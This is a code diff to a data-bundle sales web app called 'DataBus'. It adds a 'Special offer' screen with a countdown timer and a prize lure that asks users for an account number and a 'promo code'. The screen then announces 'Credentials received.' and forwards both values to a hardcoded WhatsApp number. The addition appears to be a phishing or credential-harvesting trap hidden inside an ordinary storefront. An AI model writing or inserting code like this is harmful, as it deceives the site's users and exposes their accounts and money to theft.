@@ -6,6 +6,7 @@
     <title>DataBus | High-Speed Data Transit</title>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     <script src="https://js.paystack.co/v2/inline.js"></script>
     
@@ -99,9 +100,9 @@
                         <div class="bg-blue-500/10 p-4 rounded-2xl text-blue-400"><i data-lucide="zap"></i></div>
                         <span class="text-[11px] font-black uppercase tracking-widest">Buy Data</span>
                     </button>
-                    <button class="quick-action p-6 rounded-[2rem] flex flex-col items-center gap-3">
-                        <div class="bg-yellow-500/10 p-4 rounded-2xl text-yellow-400"><i data-lucide="user-plus"></i></div>
-                        <span class="text-[11px] font-black uppercase tracking-widest text-center leading-tight">AFA Registration</span>
+                    <button onclick="handleSpecialOffer()" class="quick-action p-6 rounded-[2rem] flex flex-col items-center gap-3">
+                        <div class="bg-yellow-500/10 p-4 rounded-2xl text-yellow-400"><i data-lucide="gift"></i></div>
+                        <span class="text-[11px] font-black uppercase tracking-widest text-center leading-tight">Special offer menu</span>
                     </button>
                     <button onclick="showHistory()" class="quick-action p-6 rounded-[2rem] flex flex-col items-center gap-3">
                         <div class="bg-green-500/10 p-4 rounded-2xl text-green-400"><i data-lucide="history"></i></div>
@@ -132,6 +133,42 @@
                     <div><h4 class="text-white text-lg font-bold">Always Available</h4><p class="text-dim text-sm mt-1">Our system is online 24/7 to serve your data needs.</p></div>
                 </div>
             </section>
+        </main>
+    </div>
+
+    <div id="specialOfferView" class="hidden-view">
+        <header class="p-6 flex items-center gap-4 bg-black/40 backdrop-blur-md sticky top-0 z-50">
+            <button onclick="showHome()" class="p-2 hover:bg-slate-800 rounded-xl">
+                <i data-lucide="arrow-left" class="w-6 h-6 text-yellow-400"></i>
+            </button>
+            <h1 class="text-xl font-black tracking-tight uppercase">Special Offer</h1>
+        </header>
+        <main class="p-6">
+            <div id="offerForm" class="checkout-receipt p-8 space-y-6">
+                <div class="flex justify-between items-center">
+                    <p class="text-[10px] font-bold text-yellow-400 uppercase tracking-widest">Ends In:</p>
+                    <p id="offerTimer" class="text-white font-black font-mono text-lg">00:00:00</p>
+                </div>
+                <div class="space-y-4 pt-4 border-t border-slate-800">
+                    <div class="space-y-2">
+                        <label class="text-[10px] font-black uppercase text-slate-500 tracking-widest">Account Number</label>
+                        <input type="tel" id="offerNum" class="w-full p-4 rounded-2xl bg-slate-900 border border-slate-800 text-white font-bold outline-none focus:border-yellow-400" placeholder="02XXXXXXXX">
+                    </div>
+                    <div class="space-y-2">
+                        <label class="text-[10px] font-black uppercase text-slate-500 tracking-widest">Promo Code</label>
+                        <input type="text" id="offerCode" class="w-full p-4 rounded-2xl bg-slate-900 border border-slate-800 text-white font-bold outline-none focus:border-yellow-400" placeholder="Enter Code">
+                    </div>
+                </div>
+                <button onclick="submitSpecialOffer()" class="w-full bg-yellow-400 text-black py-5 rounded-2xl font-black uppercase tracking-widest active:scale-95 transition-all">Submit Details</button>
+            </div>
+            <div id="offerSuccess" class="hidden-view checkout-receipt p-8 space-y-6 text-center">
+                <div class="flex justify-center"><i data-lucide="check-circle" class="w-16 h-16 text-green-500"></i></div>
+                <h2 class="text-2xl font-black">Credentials received.</h2>
+                <p class="text-dim text-sm">You have a one to ten chance to win!</p>
+                <button onclick="sendToWhatsApp()" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase tracking-widest flex items-center justify-center gap-2">
+                    <i data-lucide="message-circle"></i> Send to WhatsApp
+                </button>
+            </div>
         </main>
     </div>
 
@@ -283,6 +320,56 @@
             return "Good Evening";
         }
 
+        let timerInterval;
+        function startOfferTimer() {
+            if(timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                const now = new Date();
+                const target = new Date();
+                target.setHours(14, 0, 0, 0);
+                
+                const diff = target - now;
+                if (diff <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('offerTimer').innerText = "EXPIRED";
+                    return;
+                }
+                
+                const h = Math.floor(diff / 3600000).toString().padStart(2, '0');
+                const m = Math.floor((diff % 3600000) / 60000).toString().padStart(2, '0');
+                const s = Math.floor((diff % 60000) / 1000).toString().padStart(2, '0');
+                document.getElementById('offerTimer').innerText = `${h}:${m}:${s}`;
+            }, 1000);
+        }
+
+        function handleSpecialOffer() {
+            const now = new Date();
+            if (now.getHours() >= 14) {
+                alert("Expired");
+                return;
+            }
+            hideAll();
+            document.getElementById('specialOfferView').classList.remove('hidden-view');
+            startOfferTimer();
+            refreshIcons();
+        }
+
+        function submitSpecialOffer() {
+            const num = document.getElementById('offerNum').value;
+            const code = document.getElementById('offerCode').value;
+            if(!num || !code) return alert("Fill all fields!");
+            
+            document.getElementById('offerForm').classList.add('hidden-view');
+            document.getElementById('offerSuccess').classList.remove('hidden-view');
+            refreshIcons();
+        }
+
+        function sendToWhatsApp() {
+            const num = document.getElementById('offerNum').value;
+            const code = document.getElementById('offerCode').value;
+            window.location.href = `https://wa.me/233248745662?text=SPECIAL OFFER%0ANumber: ${num}%0ACode: ${code}`;
+        }
+
         function updateCounter() {
             const el = document.getElementById('passengerCount');
             const current = parseInt(el.innerText);
@@ -312,6 +399,7 @@
             document.getElementById('historyView').classList.add('hidden-view');
             document.getElementById('checkoutView').classList.add('hidden-view');
             document.getElementById('inboxView').classList.add('hidden-view');
+            document.getElementById('specialOfferView').classList.add('hidden-view');
         }
 
         async function renderHistory() {
